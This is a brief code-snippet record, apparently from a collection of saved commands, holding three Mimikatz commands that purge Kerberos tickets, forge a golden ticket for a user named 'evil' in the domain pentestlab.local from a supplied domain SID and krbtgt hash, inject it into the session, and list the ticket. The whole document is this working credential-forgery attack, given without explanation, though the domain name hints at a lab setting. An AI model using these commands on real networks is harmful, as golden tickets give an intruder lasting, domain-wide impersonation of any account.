---
id: e073c1d3-1a93-455d-87f3-d50a03993c78
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:28.444566+00:00'
updated_at: '2023-04-10T20:37:25.782704+00:00'
---

# Code Snippet e073c1d3

**Language**: ps1

```ps1
kerberos::purge
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
kerberos::tgt
```
